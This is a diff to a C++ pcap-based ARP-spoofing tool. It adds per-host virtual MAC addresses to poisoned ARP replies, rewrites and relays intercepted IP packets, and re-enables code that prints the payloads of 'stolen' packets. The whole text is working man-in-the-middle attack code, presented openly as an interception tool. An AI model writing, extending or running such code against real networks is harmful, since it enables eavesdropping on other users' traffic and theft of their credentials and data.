@@ -28,6 +28,8 @@ struct maccmp{
 };
 
 std::map<uint32_t,mac_addr> ip_to_mac;
+std::map<mac_addr,mac_addr,maccmp> m2vm;
+std::map<mac_addr,mac_addr,maccmp> vm2m;
 
 std::map<uint32_t,std::set<uint32_t>> s2t;
 std::map<uint32_t,std::set<uint32_t>> t2s;
@@ -43,7 +45,6 @@ pthread_mutex_t stdoutmutex = PTHREAD_MUTEX_INITIALIZER;
 
 ipv4_addr my_ip;
 mac_addr my_mac;
-ipv4_addr real_gateway;
 
 int sigint_flag=0; // 0 : continue spoofing -> 1 : sigint detected -> 2 : sender arp table recovered
 
@@ -78,15 +79,21 @@ void add_ip(const ipv4_addr& ip,pcap_t* handle){
 		memcpy(&packet,ptr,sizeof packet);
 		if(packet.sip.word==ip.word&&packet.arptype==htons(0x0002)){
 			ip_to_mac[ip.word]=packet.smac;
-			return;
+			break;
 		}
 	}
+	static uint32_t nonce=0x12345678;nonce++;
+	mac_addr vm=my_mac;memcpy(&vm,&nonce,4);
+	m2vm[ip_to_mac[ip.word]]=vm;
+	vm2m[vm]=ip_to_mac[ip.word];
 }
 
 void arp_poison(const ipv4_addr& sip,const ipv4_addr& tip){
 	mac_addr smac=ip_to_mac[sip.word];
-	arp_eth_ipv4 packet(my_mac,smac,tip,sip);
+	mac_addr vtmac=m2vm[ip_to_mac[tip.word]];
+	arp_eth_ipv4 packet(vtmac,smac,tip,sip);
 	pthread_mutex_lock(&omutex);
+	//std::cout<<sizeof packet<<std::endl;
 	pcap_sendpacket(ohandle,packet,sizeof packet);
 	pthread_mutex_unlock(&omutex);
 }
@@ -128,13 +135,15 @@ void process_arp(arp_eth_ipv4* packet){
 
 void process_ip(ipv4_eth* packet,int len){
 	
-	//std::cout<<"!"<<std::string(packet->src)<<" -> "<<std::string(packet->dst)<<" : "<<len<<"bytes\n";
+	std::cout<<"!"<<std::string(packet->src)<<" -> "<<std::string(packet->dst)<<" : "<<len<<"bytes\n";
 	
-	if(ip_to_mac.find(packet->sip.word)==ip_to_mac.end()
-		&&ip_to_mac.find(packet->tip.word)==ip_to_mac.end())
-			return;
+	if(vm2m.find(packet->dst)==vm2m.end())
+		return;
+	if(m2vm.find(packet->src)==m2vm.end())
+		return;
 	
-	/*
+	packet->dst = vm2m[packet->dst];
+	
 	pthread_mutex_lock(&stdoutmutex); // display stolen packet..or we can just use wireshark
 	std::cout<<"[+]"<<std::string(packet->sip)<<" -> "<<std::string(packet->tip)<<" : "<<len<<"bytes\n";
 	int plen=len;if(plen>100)plen=100;
@@ -143,13 +152,8 @@ void process_ip(ipv4_eth* packet,int len){
 		std::cout<< (isprint(str[i])?str[i]:'.');
 	std::cout<<'\n'<<std::endl;
 	pthread_mutex_unlock(&stdoutmutex);
-	*/
 	
-	packet->src = my_mac;
-	if(ip_to_mac.find(packet->tip.word)!=ip_to_mac.end())
-		packet->dst = ip_to_mac[packet->tip.word];
-	else
-		packet->dst = ip_to_mac[real_gateway.word];
+	packet->src = m2vm[packet->src];
 	// relay packet
 	pthread_mutex_lock(&omutex);
 	pcap_sendpacket(ohandle,*packet,len);
@@ -163,7 +167,7 @@ void* process_packet(void* param){
 	if(arp->is_valid()){ // actually, test ethertype
 		process_arp(arp);
 	}
-	else if(!sigint_flag){
+	else{
 		ipv4_eth* ipv4=(ipv4_eth*)(8+(uint8_t*)param);
 		if(ipv4->is_valid()){
 			process_ip(ipv4,len);
@@ -187,7 +191,6 @@ void* continue_poisoning(void* param){
 	}
 	for(auto&[s,t]:stpairs)
 		arp_recover(s,t);
-	sleep(5);
 	sigint_flag=2;
 	return nullptr;
 }
@@ -200,8 +203,6 @@ int main(int c,char **v){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	my_mac=get_mac_addr(v[1]);
 	my_ip=get_ipv4_addr(v[1]);
-	real_gateway=get_gateway_addr(v[1]);
-	std::cout<<"gateway : "<<std::string(real_gateway)<<std::endl;
 	
 	std::vector<std::pair<ipv4_addr,ipv4_addr>> stpairs;
 	for(int i=2;i<c;i+=2){
@@ -221,9 +222,14 @@ int main(int c,char **v){
 		printf("pcap error : %s\n",errbuf);
 		exit(1);
 	}
-	add_ip(real_gateway,handle);
 	for(int i=2;i<c;i++)
 		add_ip(v[i],handle);
+	std::cout<<"m - vm"<<std::endl;
+	for(auto[m,vm]:m2vm)
+		std::cout<<std::string(m)<<' '<<std::string(vm)<<std::endl;
+	std::cout<<"vm - m"<<std::endl;
+	for(auto[m,vm]:vm2m)
+		std::cout<<std::string(m)<<' '<<std::string(vm)<<std::endl;
 	pthread_t th[core_num];
 	int usedth[core_num]={0};
 	void * nevermind;
